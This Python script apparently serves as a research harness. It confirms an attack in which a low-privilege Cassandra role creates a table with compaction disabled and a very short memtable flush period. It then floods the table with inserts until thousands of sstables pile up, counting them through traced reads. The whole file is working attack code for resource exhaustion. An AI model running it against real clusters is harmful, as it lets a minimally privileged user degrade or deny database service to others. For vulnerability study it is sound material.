#!/usr/bin/env python3
"""C9 3-b confirm: attacker steps, everything as role `mallory` (LOGIN; only grant: CREATE ON ALL KEYSPACES) over the
native protocol. No JMX, no nodetool, no superuser.
  c9b_attack.py prep  --out DIR [--period MS]   least-privilege checks, RF test keyspace, keyspace c9 + table c9.t
                                                with compaction paused and memtable_flush_period_in_ms = MS
  c9b_attack.py build --out DIR [--period MS] [--target N] [--cap S] [--seed K]
                                                1,000 random rows (pk bigint, 300 B blob) every MS ms; every ~50 s the
                                                attacker counts its own sstables from a traced 1-row read
                                                ("Executing seq scan across N sstables"); stops at N >= target
Outputs DIR/<step>.log (one line per statement: text, outcome, server warnings)."""
import argparse, os, random, re, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from c9b_drv import driver, connect

USER, PW = os.environ.get('C9B_USER', 'mallory'), os.environ.get('C9B_PW', 'mallory-pw')   # data arm: the admin builds the table


def mk_log(path):
    f = open(path, 'a', buffering=1)

    def log(s):
        f.write(f'[{time.strftime("%F %T")}] {s}\n'); print(s, flush=True)
    return log


def stmt(s, log, q, expect_ok=True):
    t0 = time.time()
    try:
        fut = s.execute_async(q)
        fut.result()
        w = getattr(fut, 'warnings', None)
        log(f'OK   ({time.time() - t0:.2f}s) {q}' + (f'  | server warnings: {w}' if w else ''))
        return True, w
    except Exception as e:
        log(f'FAIL ({time.time() - t0:.2f}s) {q}  | {type(e).__name__}: {str(e)[:300]}')
        return False, str(e)


def sstables_by_trace(s, log):
    from cassandra.query import SimpleStatement
    try:
        rs = s.execute(SimpleStatement('SELECT pk FROM c9.t LIMIT 1'), trace=True)
        tr = rs.get_query_trace(max_wait_sec=20)
        for ev in tr.events:
            m = re.search(r'Executing seq scan across (\d+) sstables', ev.description)
            if m:
                return int(m.group(1))
        log('trace: no seq-scan line: ' + ' / '.join(e.description for e in tr.events)[:400])
    except Exception as e:
        log(f'trace failed: {type(e).__name__}: {str(e)[:200]}')
    return None


def prep(a):
    log = mk_log(a.out + '/attacker-prep.log')
    cl, s = connect(USER, PW, timeout=60)
    log(f'connected as {USER}')
    # least privilege: the attacker cannot read, write or alter the victim's table
    stmt(s, log, 'SELECT * FROM vks.kv LIMIT 1')
    stmt(s, log, "INSERT INTO vks.kv (k, v) VALUES (1, 'x')")
    stmt(s, log, "ALTER TABLE vks.kv WITH compaction = {'class':'SizeTieredCompactionStrategy','enabled':'false'}")
    stmt(s, log, 'LIST ALL PERMISSIONS OF mallory')
    for r in s.execute('LIST ALL PERMISSIONS OF mallory'):
        log(f'  before: {r.role} {r.resource} {r.permission}')
    # replication factor guardrails (maximum/minimum_replication_factor_*) are off: RF 3 on a 1-node cluster is accepted
    stmt(s, log, "CREATE KEYSPACE c9rf3 WITH replication = {'class':'SimpleStrategy','replication_factor':3}")
    stmt(s, log, 'DROP KEYSPACE c9rf3')
    stmt(s, log, "CREATE KEYSPACE c9 WITH replication = {'class':'SimpleStrategy','replication_factor':1}")
    stmt(s, log, "CREATE TABLE c9.t (pk bigint PRIMARY KEY, v blob) WITH compaction = "
                 "{'class':'SizeTieredCompactionStrategy','enabled':'false'} AND memtable_flush_period_in_ms = " + str(a.period))
    for r in s.execute('LIST ALL PERMISSIONS OF mallory'):
        log(f'  after: {r.role} {r.resource} {r.permission}')
    for r in s.execute("SELECT compaction, memtable_flush_period_in_ms FROM system_schema.tables WHERE keyspace_name='c9' AND table_name='t'"):
        log(f'  system_schema.tables c9.t: compaction={dict(r.compaction)} memtable_flush_period_in_ms={r.memtable_flush_period_in_ms}')
    cl.shutdown()


def dataprep(a):
    """data arm: the attacker (mallory, only SELECT on the admin's c9.t) checks what it can and cannot do"""
    log = mk_log(a.out + '/attacker-prep.log')
    cl, s = connect(USER, PW, timeout=60)
    log(f'connected as {USER}')
    for r in s.execute(f'LIST ALL PERMISSIONS OF {USER}'):
        log(f'  permissions: {r.role} {r.resource} {r.permission}')
    stmt(s, log, "CREATE KEYSPACE m1 WITH replication = {'class':'SimpleStrategy','replication_factor':1}")
    stmt(s, log, "CREATE TABLE c9.m (pk bigint PRIMARY KEY)")
    stmt(s, log, "ALTER TABLE c9.t WITH memtable_flush_period_in_ms = 0")
    stmt(s, log, "INSERT INTO c9.t (pk, v) VALUES (1, 0x00)")
    stmt(s, log, 'SELECT * FROM vks.kv LIMIT 1')
    stmt(s, log, 'SELECT pk FROM c9.t LIMIT 1')
    n = sstables_by_trace(s, log)
    log(f'attacker-visible sstables of c9.t (trace): {n}')
    cl.shutdown()


def build(a):
    driver()
    from cassandra.concurrent import execute_concurrent_with_args
    log = mk_log(a.out + '/attacker-build.log')
    cl, s = connect(USER, PW, timeout=60)
    ps = s.prepare('INSERT INTO c9.t (pk, v) VALUES (?, ?)')
    rnd = random.Random(a.seed)
    per = a.period / 1000.0
    t0 = time.time(); nxt = t0; tick = 0; rows = 0; n = None
    log(f'build start: 1000 rows per {a.period} ms, target {a.target} sstables, cap {a.cap} s')
    while time.time() - t0 < a.cap:
        now = time.time()
        if now < nxt:
            time.sleep(nxt - now)
        nxt = max(nxt + per, time.time())
        batch = [(rnd.getrandbits(64) - 2 ** 63, rnd.randbytes(300)) for _ in range(1000)]
        execute_concurrent_with_args(s, ps, batch, concurrency=128, raise_on_first_error=True)
        tick += 1; rows += 1000
        every = a.every or (25 if (n is not None and n > a.target - 300) else 250)
        if tick % every == 0:
            n = sstables_by_trace(s, log)
            log(f'tick {tick} rows {rows} at {time.time() - t0:.0f} s: attacker-visible sstables {n}')
            if n is not None and n >= a.target:
                break
            if n is None and time.time() - t0 > 1.15 * a.target * per:
                log('trace unavailable: stopping by time (1.15 x target x period)')
                break
    time.sleep(2 * per + 1.0)   # last memtable reaches its period and flushes
    n = sstables_by_trace(s, log)
    log(f'build end: ticks {tick} rows {rows} in {time.time() - t0:.0f} s; attacker-visible sstables {n}')
    open(a.out + '/build-result.txt', 'w').write(f'ticks={tick}\nrows={rows}\nseconds={time.time() - t0:.0f}\nsstables_trace={n}\n')
    cl.shutdown()


if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('step')
    ap.add_argument('--out', required=True)
    ap.add_argument('--period', type=int, default=200)
    ap.add_argument('--target', type=int, default=2000)
    ap.add_argument('--cap', type=float, default=1200)
    ap.add_argument('--seed', type=int, default=9)
    ap.add_argument('--every', type=int, default=0)
    a = ap.parse_args()
    os.makedirs(a.out, exist_ok=True)
    {'prep': prep, 'build': build, 'dataprep': dataprep}[a.step](a)
    os._exit(0)
